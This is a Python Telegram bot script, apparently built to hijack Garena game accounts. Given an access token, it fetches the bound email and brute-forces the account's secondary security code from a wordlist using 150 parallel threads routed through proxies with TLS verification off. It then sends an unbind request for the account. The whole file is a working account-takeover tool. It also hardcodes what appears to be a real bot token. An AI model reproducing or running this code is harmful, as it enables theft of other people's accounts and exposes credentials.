import os
import sys
import json
import time
import hashlib
import threading
import asyncio
from queue import Queue
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import urllib3
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# Disable SSL warnings (if needed)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# =============== CONFIGURATION ===============
# Admin user IDs (Telegram numeric IDs)
ADMIN_IDS = [5927293826]  # Replace with your Telegram user ID(s)

# Proxy settings – loaded from environment or file
PROXY = os.getenv("SPIDEY_PROXY", None)  # fallback environment variable
PROXY_FILE = "proxy.txt"                 # file with one line: proxy URL

# If proxy file exists, override with its content
if os.path.exists(PROXY_FILE):
    with open(PROXY_FILE, "r") as f:
        proxy_line = f.readline().strip()
        if proxy_line:
            PROXY = proxy_line
            print(f"✅ Proxy loaded from {PROXY_FILE}: {PROXY}")

# Telegram Bot Token (set as environment variable or hardcode)
BOT_TOKEN = os.getenv("SPIDEY_BOT_TOKEN", "8646981427:AAENENGOAMr6HuFFPswUrNYUeGetpvurndc")

# HLO.txt file path
HLO_FILE = "HLO.txt"

# Number of concurrent workers
MAX_WORKERS = 150

# =============== GLOBAL STATE ===============
stop_workers = threading.Event()
found_code = None
found_identity_token = None
found_lock = threading.Lock()
processed_counter_lock = threading.Lock()
processed_counter = [0]
total_codes = 0
current_code_being_tested = ""
progress_message = None
progress_text = ""
bot_task_running = False
current_proxy = PROXY  # mutable proxy reference

# =============== PROXY MANAGEMENT ===============
def set_proxy(proxy_url):
    """Update global proxy. Returns True if valid format."""
    global current_proxy
    if proxy_url and (proxy_url.startswith("http://") or proxy_url.startswith("https://") or proxy_url.startswith("socks5://")):
        current_proxy = proxy_url
        # Optionally save to file for persistence
        with open(PROXY_FILE, "w") as f:
            f.write(proxy_url)
        return True
    return False

def get_proxy_dict():
    """Return proxy dict for requests, or None if no proxy."""
    if current_proxy:
        return {"http": current_proxy, "https": current_proxy}
    return None

# =============== HELPER FUNCTIONS ===============
def get_bound_email(access_token):
    """Fetch bound email using current proxy."""
    try:
        url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
        params = {'app_id': '100067', 'access_token': access_token}
        headers = {'User-Agent': 'GarenaMSDK/4.0.30'}
        proxies = get_proxy_dict()
        resp = requests.get(url, params=params, headers=headers, proxies=proxies, timeout=10, verify=False)
        if resp.status_code != 200:
            return None, f"API error: HTTP {resp.status_code}"
        data = resp.json()
        email = data.get('email')
        if not email:
            return None, "No email bound to this account."
        return email, None
    except Exception as e:
        return None, f"Failed to fetch bind info: {str(e)}"

def verify_code(email, access_token, hashed_code):
    """Verify a single security code. Returns identity_token or None."""
    if stop_workers.is_set():
        return None
    url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
    headers = {
        'User-Agent': 'GarenaMSDK/4.0.30',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'application/json'
    }
    data = {
        'email': email,
        'app_id': '100067',
        'access_token': access_token,
        'secondary_password': hashed_code
    }
    proxies = get_proxy_dict()
    try:
        resp = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=8, verify=False)
        if resp.status_code != 200:
            return None
        json_data = resp.json()
        token = json_data.get('identity_token')
        if token:
            return token
    except Exception:
        pass
    return None

def worker_task(email, access_token, code_queue, total):
    """Worker thread: pulls codes from queue and tests them."""
    global current_code_being_tested
    while not stop_workers.is_set():
        try:
            code = code_queue.get(timeout=0.5)
        except:
            break
        if stop_workers.is_set():
            break

        current_code_being_tested = code
        hashed = hashlib.sha256(code.encode('utf-8')).hexdigest()
        
        with processed_counter_lock:
            processed_counter[0] += 1
            count = processed_counter[0]
        
        token = verify_code(email, access_token, hashed)
        if token:
            with found_lock:
                if not stop_workers.is_set():
                    stop_workers.set()
                    global found_code, found_identity_token
                    found_code = code
                    found_identity_token = token
            break

def run_bruteforce(email, access_token, codes):
    """Run multi-threaded brute-force and return (success, code, identity_token)."""
    global stop_workers, found_code, found_identity_token, processed_counter, total_codes
    stop_workers.clear()
    found_code = None
    found_identity_token = None
    processed_counter = [0]
    total_codes = len(codes)

    code_queue = Queue()
    for c in codes:
        code_queue.put(c)

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = []
        for _ in range(MAX_WORKERS):
            futures.append(executor.submit(worker_task, email, access_token, code_queue, total_codes))
        
        for future in as_completed(futures):
            if stop_workers.is_set():
                for f in futures:
                    f.cancel()
                break

    return (found_code is not None), found_code, found_identity_token

# =============== TELEGRAM BOT HANDLERS ===============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ You are not authorized to use this bot.")
        return
    proxy_status = f"Proxy: `{current_proxy}`" if current_proxy else "Proxy: None"
    await update.message.reply_text(
        f"🔐 *Spidey Unbind Bot*\n\n"
        f"Commands:\n"
        f"/unbind <access_token> – start unbind process\n"
        f"/setproxy <proxy_url> – set proxy (e.g., http://user:pass@host:port)\n"
        f"/proxy – show current proxy\n\n"
        f"{proxy_status}\n\n"
        f"Make sure `{HLO_FILE}` exists in the bot's directory.",
        parse_mode="Markdown"
    )

async def show_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    status = f"Proxy: `{current_proxy}`" if current_proxy else "No proxy set."
    await update.message.reply_text(status, parse_mode="Markdown")

async def set_proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if not args:
        await update.message.reply_text("❌ Please provide a proxy URL.\nExample: `/setproxy http://user:pass@host:port`", parse_mode="Markdown")
        return
    proxy_url = args[0].strip()
    if set_proxy(proxy_url):
        await update.message.reply_text(f"✅ Proxy set to: `{proxy_url}`", parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ Invalid proxy format. Must start with http://, https://, or socks5://")

async def unbind(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global bot_task_running, progress_message, progress_text

    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ You are not authorized.")
        return

    if bot_task_running:
        await update.message.reply_text("⏳ Another unbind task is already running. Please wait.")
        return

    args = context.args
    if not args:
        await update.message.reply_text("❌ Please provide an access token.\nExample: `/unbind abc123token`", parse_mode="Markdown")
        return

    access_token = args[0].strip()
    if not access_token:
        await update.message.reply_text("❌ Access token cannot be empty.")
        return

    if not os.path.exists(HLO_FILE):
        await update.message.reply_text(f"❌ `{HLO_FILE}` not found. Please create it with one code per line.", parse_mode="Markdown")
        return

    with open(HLO_FILE, "r") as f:
        codes = [line.strip() for line in f if line.strip()]
    if not codes:
        await update.message.reply_text(f"❌ `{HLO_FILE}` is empty.", parse_mode="Markdown")
        return

    status_msg = await update.message.reply_text("🔄 Fetching bound email...")
    
    email, error = get_bound_email(access_token)
    if error:
        await status_msg.edit_text(f"❌ {error}")
        return

    await status_msg.edit_text(f"✅ Bound email: `{email}`\n🔍 Loaded {len(codes)} codes. Starting brute-force with {MAX_WORKERS} workers...", parse_mode="Markdown")

    progress_message = await update.message.reply_text("⏳ Brute-forcing... (0/{})".format(len(codes)))
    progress_text = ""
    bot_task_running = True

    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(None, run_bruteforce, email, access_token, codes)

    success, code, identity_token = result
    bot_task_running = False

    if success:
        await progress_message.edit_text(f"✅ **SUCCESS!**\nCracked code: `{code}`\n\nSending unbind request...", parse_mode="Markdown")
        unbind_url = "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"
        headers = {
            'User-Agent': 'GarenaMSDK/4.0.30',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        data = {
            'app_id': '100067',
            'access_token': access_token,
            'identity_token': identity_token
        }
        proxies = get_proxy_dict()
        try:
            resp = requests.post(unbind_url, headers=headers, data=data, proxies=proxies, timeout=10, verify=False)
            await update.message.reply_text(f"📨 *Unbind Response:*\n```\n{resp.text}\n```", parse_mode="Markdown")
        except Exception as e:
            await update.message.reply_text(f"❌ Unbind request failed: {str(e)}")
    else:
        await progress_message.edit_text("❌ No valid security code found in HLO.txt.")

async def progress_updater(context: ContextTypes.DEFAULT_TYPE):
    global progress_message, progress_text, processed_counter, total_codes, current_code_being_tested
    if progress_message is None or bot_task_running is False:
        return
    
    count = processed_counter[0] if processed_counter else 0
    total = total_codes
    current = current_code_being_tested
    new_text = f"⏳ Testing: `{current}`\nProgress: {count}/{total} ({count*100//total if total else 0}%)"
    if new_text != progress_text:
        progress_text = new_text
        try:
            await progress_message.edit_text(progress_text, parse_mode="Markdown")
        except Exception:
            pass

# =============== MAIN ===============
def main():
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ Please set SPIDEY_BOT_TOKEN environment variable or edit the script.")
        sys.exit(1)

    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("unbind", unbind))
    application.add_handler(CommandHandler("setproxy", set_proxy_command))
    application.add_handler(CommandHandler("proxy", show_proxy))

    job_queue = application.job_queue
    if job_queue:
        job_queue.run_repeating(progress_updater, interval=3, first=0)

    print("🤖 Spidey Bot is running...")
    print(f"🌐 Current proxy: {current_proxy if current_proxy else 'None'}")
    application.run_polling()

if __name__ == "__main__":
    main()
